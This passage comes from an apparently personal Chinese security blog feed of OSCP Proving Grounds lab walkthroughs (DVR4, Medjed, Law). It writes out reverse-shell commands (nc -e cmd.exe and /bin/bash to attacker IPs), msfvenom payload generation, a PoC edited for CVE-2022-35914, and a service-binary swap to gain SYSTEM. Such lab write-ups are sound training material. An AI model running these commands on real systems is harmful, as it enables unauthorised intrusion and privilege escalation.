class="built_in">PS</span> C:\freezeScript&gt; <span class="built_in">cat</span> win10.ps1</span><br><span class="line"><span class="built_in">Add-LocalGroupMember</span> <span class="literal">-Group</span> <span class="string">&quot;Administrators&quot;</span> <span class="literal">-Member</span> <span class="string">&quot;viewer&quot;</span></span><br></pre></td></tr></table></figure>

<p>重启时提示无权限</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt; shutdown /<span class="built_in">r</span> /t <span class="number">0</span></span><br><span class="line">Access is denied.(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p>GPT的回答</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">尽管你有 SeShutdownPrivilege 权限，这个错误通常是由于缺少管理员权限导致的。在 PowerShell 或命令提示符中执行 shutdown 命令需要管理员权限，即使你有相关权限，也需要以管理员身份运行 PowerShell。</span><br></pre></td></tr></table></figure>

<h3 id="winpeas"><a href="#winpeas" class="headerlink" title="winpeas"></a>winpeas</h3><p>上传winpeas执行也没有得到有用信息。viewer的权限也比较低，很多内容收集不到。</p>
<h3 id="DRV4配置"><a href="#DRV4配置" class="headerlink" title="DRV4配置"></a>DRV4配置</h3><p>再确认下配置文件， dir发现没有ProgramData文件夹，但是前面已经读到配置文件了，文件夹应该是存在的，<code>dir -froce</code>查看是被隐藏了</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt; <span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                        </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                                        </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">40</span> AM                freezeScript                                                                                </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">6</span>:<span class="number">08</span> AM                Microsoft                                                                                   </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">7</span>/<span class="number">2019</span>   <span class="number">1</span>:<span class="number">14</span> AM                PerfLogs                                                                                    </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">07</span> AM                Program Files                                                                               </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span>   <span class="number">5</span>:<span class="number">55</span> AM                Program Files (x86)                                                                         </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">21</span> AM                Users                                                                                       </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">07</span> AM                Windows                                                                                     </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">4</span>:<span class="number">52</span> AM           <span class="number">2690</span> output.txt                                                                                  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">dir</span> <span class="literal">-force</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                        </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                                        </span><br><span class="line">d<span class="literal">--hs-</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">5</span>:<span class="number">06</span> AM                <span class="variable">$Recycle</span>.Bin                                                                                </span><br><span class="line">d<span class="literal">--h--</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">5</span>:<span class="number">02</span> AM                <span class="variable">$WinREAgent</span>                                                                                 </span><br><span class="line">d<span class="literal">--hs-</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">08</span> AM                Config.Msi                                                                                  </span><br><span class="line">d<span class="literal">--hsl</span>         <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">10</span>:<span class="number">28</span> AM                Documents and Settings                                                                      </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">40</span> AM                freezeScript                                                                                </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">6</span>:<span class="number">08</span> AM                Microsoft                                                                                   </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">7</span>/<span class="number">2019</span>   <span class="number">1</span>:<span class="number">14</span> AM                PerfLogs                                                                                    </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">07</span> AM                Program Files                                                                               </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span>   <span class="number">5</span>:<span class="number">55</span> AM                Program Files (x86)                                                                         </span><br><span class="line">d<span class="literal">--h--</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">24</span> AM                ProgramData                                                                                 </span><br><span class="line">d<span class="literal">--hs-</span>         <span class="number">3</span>/<span class="number">11</span>/<span class="number">2022</span>  <span class="number">10</span>:<span class="number">03</span> PM                Recovery                                                                                    </span><br><span class="line">d<span class="literal">--hs-</span>         <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span>   <span class="number">3</span>:<span class="number">31</span> AM                System Volume Information                                                                   </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">21</span> AM                Users                                                                                       </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">07</span> AM                Windows                                                                                     </span><br><span class="line"><span class="literal">-a-hs-</span>          <span class="number">8</span>/<span class="number">1</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">33</span> PM           <span class="number">8192</span> DumpStack.log.tmp                                                                           </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">4</span>:<span class="number">52</span> AM           <span class="number">2690</span> output.txt                                                                                  </span><br><span class="line"><span class="literal">-a-hs-</span>          <span class="number">8</span>/<span class="number">1</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">33</span> PM      <span class="number">671088640</span> pagefile.sys                                                                                </span><br><span class="line"><span class="literal">-a-hs-</span>          <span class="number">8</span>/<span class="number">1</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">33</span> PM      <span class="number">268435456</span> swapfile.sys                                                                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cd</span> <span class="string">&#x27;.\ProgramData\PY_Software\Argus Surveillance DVR\&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\ProgramData\PY_Software\Argus Surveillance DVR&gt; <span class="built_in">dir</span> <span class="literal">-force</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\ProgramData\PY_Software\Argus Surveillance DVR</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                        </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                                        </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">26</span> AM                Gallery                                                                                     </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">24</span> AM                Images                                                                                      </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">26</span> AM                Logs                                                                                        </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">28</span> AM             <span class="number">38</span> Argus Surveillance DVR.DVRSes                                                               </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">45</span> AM           <span class="number">5782</span> DVRParams.ini                                                                               </span><br></pre></td></tr></table></figure>

<p><code>cat DVRParams.ini</code>看下内容， 这次展示了很多内容，看来是通过cur查看到时候展示行数有限，被截断了。在user部分有administrator的密码密文</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-109.png.png"></p>
<p>回到50130.py破解之</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python <span class="number">50130</span>.py </span><br><span class="line">/home/kali/Tools/pg/DVR4/<span class="number">50130</span>.py:<span class="number">27</span>: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\_&#x27;</span></span><br><span class="line">  banner = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#########################################</span></span><br><span class="line"><span class="string">#    _____ Surveillance DVR 4.0         #</span></span><br><span class="line"><span class="string">#   /  _  \_______  ____  __ __  ______ #</span></span><br><span class="line"><span class="string">#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #</span></span><br><span class="line"><span class="string"># /    |    \  | \/ /_/  &gt;  |  /\___ \  #</span></span><br><span class="line"><span class="string"># \____|__  /__|  \___  /|____//____  &gt; #</span></span><br><span class="line"><span class="string">#         \/     /_____/            \/  #</span></span><br><span class="line"><span class="string">#        Weak Password Encryption       #</span></span><br><span class="line"><span class="string">############ @deathflash1411 ############</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] ECB4:1</span></span><br><span class="line"><span class="string">[+] 53D1:4</span></span><br><span class="line"><span class="string">[+] 6069:W</span></span><br><span class="line"><span class="string">[+] F641:a</span></span><br><span class="line"><span class="string">[+] E03B:t</span></span><br><span class="line"><span class="string">[+] D9BD:c</span></span><br><span class="line"><span class="string">[+] 956B:h</span></span><br><span class="line"><span class="string">[+] FE36:D</span></span><br><span class="line"><span class="string">[+] BD8F:0</span></span><br><span class="line"><span class="string">[+] 3CD9:g</span></span><br><span class="line"><span class="string">[-] D9A8:Unknown</span></span><br></pre></td></tr></table></figure>

<p>最后一个字符没有解出来，看 代码注释，是作者没加特殊字符的编码信息</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-108.png.png"></p>
<p>特殊字符不多，以administrator用户执行反弹shell, 输入密码一个个试下，输入$时，成功获取shell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runas /env /profile /user:DVR4\Administrator &quot;C:\temp\nc.exe -e cmd.exe 192.168.118.14 443</span><br><span class="line">Enter the password for DVR4\Administrator:  </span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nc <span class="literal">-nvlp</span> <span class="number">443</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">443</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.45.234</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.140.179</span>] <span class="number">51874</span></span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.19044.1645</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\ProgramData\PY_Software\Argus Surveillance DVR&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">dvr4\administrator</span><br></pre></td></tr></table></figure>

<p>官方walkThrough中是在user页面新建了一个user用户，密码设为全部字符 <code>!@#$%^&amp;*()</code>在通过配置文件里的密码对比得到密码明文</p>
<p>之前一直以为runas只能在有桌面环境的前提下使用</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-111.png.png"></p>
<h3 id="gsm-codec-dll提权"><a href="#gsm-codec-dll提权" class="headerlink" title="gsm_codec.dll提权"></a><code>gsm_codec.dll</code>提权</h3><p>靶机上没有gcc环境，未测试</p>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>本文是我在逐步看了hits之后依然没有成功后，看了完成walkThrough后，重头重新打靶的记录，<strong>但是更令我感到挫败和沮丧的是如果重新遇到这个靶机，并且整体思路、步骤正确的情况下我仍然可能拿不下这台靶机，它让我推翻自己之前解决问题的方式</strong></p>
<ol>
<li><p>信息收集阶段</p>
</li>
<li><ol>
<li>在看到了arugs surveillance存在的几个漏洞之后，我放弃了继续在web页面上继续收集信息，导致没能找到viewer用户</li>
</ol>
</li>
<li><ol start="2">
<li>弱密码破解poc看了之后发现用不到，并没有认真看代码，忽略了其中的配置文件注释，也尝试读取这个文件</li>
</ol>
</li>
<li><ol start="3">
<li><strong>更为严重的是：即使在这一步我看到了配置文件路径，并且测试读了配置文件，但是没有有效信息，在后续拿到viewer shell之后，我还是不会想到再去检查一次这个配置文件，因为在我的脑子里是排除法，一直在排查自己认为无法有效利用的东西，下意识里给自己减轻因为知识面不足、经验不足带来的心虚的负担</strong></li>
</ol>
</li>
<li><p>提权阶段</p>
</li>
<li><ol start="4">
<li>在发现seShutdownPrivilege无法提权，并且winpeas没有找到有用信息后，完全没了思路，哪怕再去搜一下DRV4的相关信息呢，过于依赖工具了。</li>
</ol>
</li>
<li><ol start="5">
<li><strong>更为严重的是：即使在这一步我成功找到了配置文件，我相信自己仍然不会第一时间想到searchSploit已经发现的exploit, 因为在我的脑海是排查法，一直在排除自己认为无法有效利用的东西，下意识里给自己减轻因为知识面不足、经验不足带来的心虚的负担</strong></li>
</ol>
</li>
</ol>
<p><strong>信息收集很重要，不要忽略任何信息，不要做减法排查，从最有可能的点着手，而不是像自己以前优先排除后聚焦的解决问题方式</strong></p>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Medjed</title>
    <url>/post/20250303001229.html</url>
    <content><![CDATA[<h1 id="Difficulty"><a href="#Difficulty" class="headerlink" title="Difficulty"></a>Difficulty</h1><p>Medium</p>
<h1 id="Scans"><a href="#Scans" class="headerlink" title="Scans"></a>Scans</h1><h2 id="autorecon"><a href="#autorecon" class="headerlink" title="autorecon"></a>autorecon</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] msrpc found on tcp/135.</span><br><span class="line"></span><br><span class="line">[*] netbios-ssn found on tcp/139.</span><br><span class="line"></span><br><span class="line">[*] microsoft-ds found on tcp/445.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] mysql found on tcp/3306.</span><br><span class="line">    MariaDB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] http-alt found on tcp/8000.</span><br><span class="line">    Server: BarracudaServer.com (Windows)</span><br><span class="line">    + OPTIONS: WebDAV enabled (MKCOL LOCK COPY PROPPATCH PROPFIND UNLOCK listed as allowed).</span><br><span class="line"></span><br><span class="line">[*] unknown found on tcp/5040.</span><br><span class="line"></span><br><span class="line">[*] ftp found on tcp/30021.</span><br><span class="line">    FileZilla ftpd 0.9.41 beta</span><br><span class="line">    可匿名登录</span><br><span class="line"></span><br><span class="line">[*] unknown found on tcp/33033.</span><br><span class="line">    sugid</span><br><span class="line"></span><br><span class="line">[*] unknown found on tcp/44330.</span><br><span class="line">    ssl: 8000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] http found on tcp/45332.</span><br><span class="line">    Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)</span><br><span class="line">    Quiz App</span><br><span class="line">    http://192.168.111.127:45332/phpinfo.php</span><br><span class="line">        Loaded Configuration File        C:\xampp\php\php.ini</span><br><span class="line">        Zend Engine v3.3.23</span><br><span class="line">        TMP        \xampp\tmp</span><br><span class="line">        SQLite Library        3.28.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] http found on tcp/45443.</span><br><span class="line">    Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23</span><br><span class="line">    seems like 45332</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/49664.</span><br><span class="line">[*] msrpc found on tcp/49665.</span><br><span class="line">[*] msrpc found on tcp/49666.</span><br><span class="line">[*] msrpc found on tcp/49667.</span><br><span class="line">[*] msrpc found on tcp/49668.</span><br><span class="line">[*] msrpc found on tcp/49669.</span><br></pre></td></tr></table></figure>

<h2 id="445-smb"><a href="#445-smb" class="headerlink" title="445 smb"></a>445 smb</h2><p>匿名用户无法登录</p>
<h2 id="30021-ftp"><a href="#30021-ftp" class="headerlink" title="30021 ftp"></a>30021 ftp</h2><p>可以匿名登录, 看起来是一个project, 使用lft命令全部下载 <code>lftp -e &quot;mirror -c -e / ftp&quot;</code> <code>ftp://192.168.111.127:30021</code>, 但是没有找到什么有价值信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp -a -A 192.168.111.127 -p 30021</span><br><span class="line">Connected to 192.168.111.127.</span><br><span class="line">220-FileZilla Server version 0.9.41 beta</span><br><span class="line">220-written by Tim Kosse (Tim.Kosse@gmx.de)</span><br><span class="line">220 Please visit http://sourceforge.net/projects/filezilla/</span><br><span class="line">331 Password required <span class="keyword">for</span> anonymous</span><br><span class="line">230 Logged on</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">229 Entering Extended Passive Mode (|||49905|)</span><br><span class="line">150 Connection accepted</span><br><span class="line">-r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore</span><br><span class="line">drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app</span><br><span class="line">drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin</span><br><span class="line">drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config</span><br><span class="line">-r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru</span><br><span class="line">drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db</span><br><span class="line">-r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile</span><br><span class="line">drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib</span><br><span class="line">drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 <span class="built_in">log</span></span><br><span class="line">-r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json</span><br><span class="line">drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public</span><br><span class="line">-r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile</span><br><span class="line">-r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md</span><br><span class="line">drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 <span class="built_in">test</span></span><br><span class="line">drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp</span><br><span class="line">drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor</span><br><span class="line">226 Transfer OK</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>

<h2 id="8000-44330-BarracudaServer"><a href="#8000-44330-BarracudaServer" class="headerlink" title="8000&#x2F;44330 BarracudaServer"></a>8000&#x2F;44330 BarracudaServer</h2><p><code>nikto -ask=no -Tuning=x4567890ac -nointeractive -host</code> <code>http://192.168.111.127:8000</code> <code>2&gt;&amp;1</code>结果提示webdav enabled, 可以尝试利用上传文件。</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-131.png.png"></p>
<p>浏览器打开链接，about 页面发现版本号 BarracudaDrive 6.5</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-130.png.png"></p>
<p>searchsploit BarracudaDrive</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-129.png.png"></p>
<p>查看Description部分，是因为bd service 是localSystem执行的，如果可以替换bd.exe重启以后可以实现提权，很有用的信息，等下提权的时候试下。</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-136.png.png"></p>
<h2 id="33033"><a href="#33033" class="headerlink" title="33033"></a>33033</h2><p>发现了一些用户名，保存下来，后续可能有用，右上角login进入登录页面，登录页面有forget password按钮</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-133.png.png"></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-134.png.png"></p>
<p>输入用户名、助记词、新密码可以重置密码，试了上面的用户名和他们的slogan, 没有成功。（实际上题解的利用方式就是重置了jerren的密码，Reminder是paranoid, 是slogan中的关键词，然后利用sql注入写websell)</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-132.png.png"></p>
<h2 id="45332-45443"><a href="#45332-45443" class="headerlink" title="45332&#x2F;45443"></a>45332&#x2F;45443</h2><p>nikto发现phpinfo.php, gobuster使用的字典没有扫到</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-135.png.png"></p>
<h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><p>继续看下webdav, 访问 <code>https://192.168.111.127:44330/</code>会弹出set administraor account页面，输入admin:password, email随意。然后进入web-file-server</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-139.png.png"></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-138.png.png"></p>
<p>点击fs进入<a href="https://192.168.111.127:44330/fs/%E7%84%B6%E5%90%8E%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95">https://192.168.111.127:44330/fs/然后发现可以访问任意目录</a>, 然后根据 45332端口的phpinfo中目录信息来到 <a href="https://192.168.111.127:44330/fs/c/xampp/htdocs/">https://192.168.111.127:44330/fs/c/xampp/htdocs/</a>, <code>msfvenom -p php/reverse_php LHOST=192.168.45.165 LPORT=8000 -f raw -o r.php</code> 生成webshell上传，请求后得到webshell</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-137.png.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">8000</span></span><br><span class="line">listening on [any] <span class="number">8000</span> ...</span><br><span class="line">connect to [<span class="number">192.168</span>.<span class="number">45.165</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span>.<span class="number">111.127</span>] <span class="number">49886</span></span><br><span class="line">whoami</span><br><span class="line">medjed\jerren</span><br></pre></td></tr></table></figure>

<h1 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a>Escalation</h1><p>按照48789.txt的步骤检查bd service和bd.exe权限，完全符合，直接 <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o bd.exe</code> 替换bd.exe, 然后 <code>shutdown /r /t 0</code> 重启，然后得到webshell</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Insecure Folder Permission</span></span><br><span class="line">C:\&gt;cacls C:\bd</span><br><span class="line">C:\bd BUILTIN\Administrators:(OI)(CI)(ID)F</span><br><span class="line">      NT AUTHORITY\SYSTEM:(OI)(CI)(ID)F</span><br><span class="line">      BUILTIN\Users:(OI)(CI)(ID)<span class="built_in">R</span></span><br><span class="line">      NT AUTHORITY\Authenticated Users:(ID)C</span><br><span class="line">      NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C</span><br><span class="line"></span><br><span class="line"><span class="comment">## Insecure File/Service Permission</span></span><br><span class="line">C:\&gt;cacls C:\bd\bd.exe</span><br><span class="line">C:\bd\bd.exe BUILTIN\Administrators:(ID)F</span><br><span class="line">             NT AUTHORITY\SYSTEM:(ID)F</span><br><span class="line">             BUILTIN\Users:(ID)<span class="built_in">R</span></span><br><span class="line">             NT AUTHORITY\Authenticated Users:(ID)C</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">sc</span> qc bd</span><br><span class="line">[<span class="type">SC</span>] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: bd</span><br><span class="line">        <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : <span class="number">2</span>   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : <span class="number">1</span>   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : <span class="string">&quot;C:\bd\bd.exe&quot;</span></span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : <span class="number">0</span></span><br><span class="line">        DISPLAY_NAME       : BarracudaDrive ( bd ) service</span><br><span class="line">        DEPENDENCIES       : Tcpip</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">443</span></span><br><span class="line">listening on [any] <span class="number">443</span> ...</span><br><span class="line"></span><br><span class="line">connect to [<span class="number">192.168</span>.<span class="number">45.165</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span>.<span class="number">111.127</span>] <span class="number">49668</span></span><br><span class="line">Microsoft Windows [Version <span class="number">10.0</span>.<span class="number">19042.1387</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br><span class="line">C:\WINDOWS\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Law</title>
    <url>/post/20250216205050.html</url>
    <content><![CDATA[<h1 id="Difficulty"><a href="#Difficulty" class="headerlink" title="Difficulty"></a>Difficulty</h1><p>Medium</p>
<h1 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> ssh found on tcp/<span class="number">22.</span></span><br><span class="line">    OpenSSH <span class="number">8.4</span>p1</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> http found on tcp/<span class="number">80.</span></span><br><span class="line">    Apache/<span class="number">2.4</span><span class="number">.56</span></span><br></pre></td></tr></table></figure>

<h1 id="80-htmlLaw"><a href="#80-htmlLaw" class="headerlink" title="80 htmlLaw"></a>80 htmlLaw</h1><p>版本：1.2.5</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-75.png.png"></p>
<h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p><img data-src="https://thiiiiink.com/202508/asynccode-77.png.png"></p>
<blockquote>
<p><a href="https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py">https://github.com/cosad3s/CVE-2022-35914-poc/blob/main/CVE-2022-35914.py</a></p>
</blockquote>
<p>执行 <code>python cve-2022-35914.py -u</code> <code>http://192.168.212.190</code> <code>-c &quot;id&quot;</code> 后提示失败，查看代码修改默认uri为 <code>/index.php</code>,重新执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">url,cmd,user_agent,check,hook</span>):</span><br><span class="line">    <span class="comment"># uri = &quot;/vendor/htmlawed/htmlawed/htmLawedTest.php&quot;</span></span><br><span class="line">    uri = <span class="string">&quot;/index.php&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: user_agent&#125;</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    response_part1 = session.get(<span class="built_in">str</span>(url)+uri, verify=<span class="literal">False</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(response_part1.text)</span><br><span class="line">    <span class="keyword">if</span> (response_part1.status_code != <span class="number">200</span>):</span><br><span class="line">        fail()</span><br></pre></td></tr></table></figure>

<p>重新执行成功得到返回</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-76.png.png"></p>
<p>直接尝试nc 反弹shell: <code>python cve-2022-35914.py -u</code> <code>http://192.168.212.190</code> <code>-c &quot;nc 192.168.45.234 80 -e /bin/bash</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">80</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">80</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.212</span><span class="number">.190</span><span class="punctuation">]</span> <span class="number">60626</span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>

